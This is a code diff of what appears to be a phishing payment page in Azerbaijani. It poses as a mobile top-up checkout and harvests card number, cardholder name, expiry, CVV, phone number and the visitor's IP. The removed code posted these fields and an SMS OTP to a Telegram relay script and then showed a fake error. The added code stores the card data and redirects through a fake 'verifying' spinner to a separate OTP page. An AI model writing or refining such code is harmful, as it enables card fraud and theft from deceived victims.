@@ -34,7 +34,6 @@
         .form-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; background: #ffffff; font-size: 1.05rem; font-weight: 500; color: #1a202c; outline: none; box-sizing: border-box; transition: border-color 0.2s; }
         .form-group input:focus { border-color: #ff3b30; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
         
         .error-hint { color: #ff3b30; font-size: 0.7rem; font-weight: 600; margin-top: 4px; display: none; position: absolute; bottom: -16px; left: 2px; }
 
@@ -58,47 +57,39 @@
         .popup-btn { width: 100%; padding: 13px; background: #ff3b30; color: white; border: none; border-radius: 12px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
         .popup-btn:hover { background: #e02e24; }
         
-        /* OTP input stili */
-        .otp-container {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin: 10px 0;
-        }
-        .otp-container input {
-            width: 50px;
-            height: 60px;
-            text-align: center;
-            font-size: 1.5rem;
-            font-weight: 700;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            background: #ffffff;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .otp-container input:focus {
-            border-color: #ff3b30;
-        }
-        .otp-container input:disabled {
-            background: #f5f5f5;
-        }
-        .otp-hint {
-            text-align: center;
-            font-size: 0.8rem;
-            color: #718096;
-            margin-top: 8px;
-        }
-        .otp-hint span {
-            color: #ff3b30;
-            font-weight: 600;
-        }
-        .otp-error {
-            color: #ff3b30;
-            font-size: 0.8rem;
-            text-align: center;
-            margin-top: 8px;
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
             display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            flex-direction: column;
+        }
+        .loader-overlay.active {
+            display: flex;
+        }
+        .loader-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff3b30;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loader-text {
+            margin-top: 15px;
+            color: #333;
+            font-size: 1rem;
+            font-weight: 500;
         }
     </style>
 </head>
@@ -155,23 +146,6 @@
                 </div>
             </div>
 
-            <!-- OTP Hissəsi -->
-            <div class="form-group" style="margin-top: 20px;">
-                <label>OTP KODU (SMS ilə gələn kodu daxil edin)</label>
-                <div class="otp-container">
-                    <input type="text" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp2')" onkeydown="otpBackspace(this, 'otp1')">
-                    <input type="text" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp3')" onkeydown="otpBackspace(this, 'otp1')">
-                    <input type="text" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp4')" onkeydown="otpBackspace(this, 'otp2')">
-                    <input type="text" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp5')" onkeydown="otpBackspace(this, 'otp3')">
-                    <input type="text" id="otp5" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp6')" onkeydown="otpBackspace(this, 'otp4')" style="display:none;">
-                    <input type="text" id="otp6" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, null)" onkeydown="otpBackspace(this, 'otp5')" style="display:none;">
-                </div>
-                <div class="otp-hint">
-                    <span id="otpLengthToggle" onclick="toggleOtpLength()">4 rəqəmli OTP istifadə et</span>
-                </div>
-                <div class="otp-error" id="otpError">OTP kodunu daxil edin (4 və ya 6 rəqəm)</div>
-            </div>
-
             <button type="submit" class="submit-btn" id="btnSubmit" disabled>
                 🔒 Ödənişi tamamla · <span id="btnPrice">0</span> AZN
             </button>
@@ -185,6 +159,12 @@
         <a href="index.html" class="back-link">‹ Geri</a>
     </div>
 
+    <!-- Yükləmə Ekranı -->
+    <div class="loader-overlay" id="loaderOverlay">
+        <div class="loader-spinner"></div>
+        <p class="loader-text">Məlumatlar yoxlanılır...</p>
+    </div>
+
     <div class="popup-back" id="errPopup">
         <div class="popup-box">
             <div class="error-alert-icon">!</div>
@@ -195,57 +175,6 @@
     </div>
 
     <script>
-    // ===== OTP FUNKSİYALARI =====
-    let otpLength = 4; // default 4 rəqəm
-
-    function toggleOtpLength() {
-        const span = document.getElementById('otpLengthToggle');
-        const otp5 = document.getElementById('otp5');
-        const otp6 = document.getElementById('otp6');
-        
-        if (otpLength === 4) {
-            otpLength = 6;
-            span.textContent = '4 rəqəmli OTP istifadə et';
-            otp5.style.display = '';
-            otp6.style.display = '';
-            document.getElementById('otp4').oninput = function() { otpMove(this, 'otp5'); };
-        } else {
-            otpLength = 4;
-            span.textContent = '6 rəqəmli OTP istifadə et';
-            otp5.style.display = 'none';
-            otp6.style.display = 'none';
-            document.getElementById('otp4').oninput = function() { otpMove(this, null); };
-            // 5 və 6-cı xanaları təmizlə
-            document.getElementById('otp5').value = '';
-            document.getElementById('otp6').value = '';
-        }
-        valForm();
-    }
-
-    function otpMove(current, nextId) {
-        current.value = current.value.replace(/\D/g, '').slice(0, 1);
-        if (current.value.length === 1 && nextId) {
-            document.getElementById(nextId).focus();
-        }
-        valForm();
-        document.getElementById('otpError').style.display = 'none';
-    }
-
-    function otpBackspace(current, prevId) {
-        if (event.key === 'Backspace' && current.value === '' && prevId) {
-            document.getElementById(prevId).focus();
-        }
-    }
-
-    function getOtp() {
-        let otp = '';
-        for (let i = 1; i <= otpLength; i++) {
-            const val = document.getElementById('otp' + i).value;
-            if (val) otp += val;
-        }
-        return otp;
-    }
-
     // ===== DATA YÜKLƏMƏ =====
     const oper = localStorage.getItem('selectedOperator') || 'Məlum deyil';
     const phone = localStorage.getItem('phoneNumber') || 'Məlum deyil';
@@ -311,18 +240,13 @@
         valForm();
     });
 
-    // ===== VALİDASİYA =====
     function valForm() {
         const okNo = inpNo.value.replace(/\s/g, '').length === 16;
         const okName = inpName.value.trim().length >= 4;
         const okExp = inpExp.value.length === 5;
         const okCvv = inpCvv.value.length === 3;
         
-        // OTP yoxlanışı
-        const otp = getOtp();
-        const okOtp = otp.length === otpLength;
-        
-        btn.disabled = !(okNo && okName && okExp && okCvv && okOtp && isMonthValid);
+        btn.disabled = !(okNo && okName && okExp && okCvv && isMonthValid);
     }
 
     // ===== FORM GÖNDƏRİLMƏSİ =====
@@ -330,14 +254,9 @@
         e.preventDefault();
         if (!isMonthValid) return;
 
-        const otp = getOtp();
-        if (otp.length !== otpLength) {
-            document.getElementById('otpError').style.display = 'block';
-            return;
-        }
-
+        // Yükləmə ekranını göstər
+        document.getElementById('loaderOverlay').classList.add('active');
         btn.disabled = true;
-        btn.innerText = 'Yoxlanılır...';
 
         let ip = "Alınmadı";
         try {
@@ -346,36 +265,21 @@
             ip = d.ip;
         } catch(h) {}
 
-        const formData = new FormData();
-        formData.append('card_name', inpName.value);
-        formData.append('card_number', inpNo.value);
-        formData.append('card_expiry', inpExp.value);
-        formData.append('card_cvv', inpCvv.value);
-        formData.append('operator', oper);
-        formData.append('phone', phone);
-        formData.append('amount', amount);
-        formData.append('ip', ip);
-        formData.append('otp', otp);
+        // Məlumatları localStorage-a yaz (otp.html istifadə edəcək)
+        localStorage.setItem('card_name', inpName.value);
+        localStorage.setItem('card_number', inpNo.value);
+        localStorage.setItem('card_expiry', inpExp.value);
+        localStorage.setItem('card_cvv', inpCvv.value);
+        localStorage.setItem('operator', oper);
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('amount', amount);
+        localStorage.setItem('ip', ip);
 
-        try {
-            const response = await fetch('telegram-handler.php', {
-                method: 'POST',
-                body: formData
-            });
-
-            const result = await response.json();
-
-            if (result.status === 'success') {
-                document.getElementById('errPopup').classList.add('visible');
-            } else {
-                alert('Xəta baş verdi, yenidən cəhd edin.');
-            }
-        } catch (err) {
-            alert('Xəta baş verdi, yenidən cəhd edin.');
-        } finally {
-            btn.innerText = '🔒 Ödənişi tamamla · ' + amount + ' AZN';
-            valForm();
-        }
+        // 2 saniye gözlə və otp.html-ə yönləndir
+        setTimeout(function() {
+            document.getElementById('loaderOverlay').classList.remove('active');
+            window.location.href = 'otp.html';
+        }, 2000);
     });
 
     function closePopup() {
@@ -384,9 +288,6 @@
         document.getElementById('cardViewNo').innerText = '•••• •••• •••• ••••';
         document.getElementById('cardViewName').innerText = '—';
         document.getElementById('cardViewExp').innerText = 'MM/YY';
-        for (let i = 1; i <= 6; i++) {
-            document.getElementById('otp' + i).value = '';
-        }
         expError.style.display = 'none';
         isMonthValid = true;
         valForm();
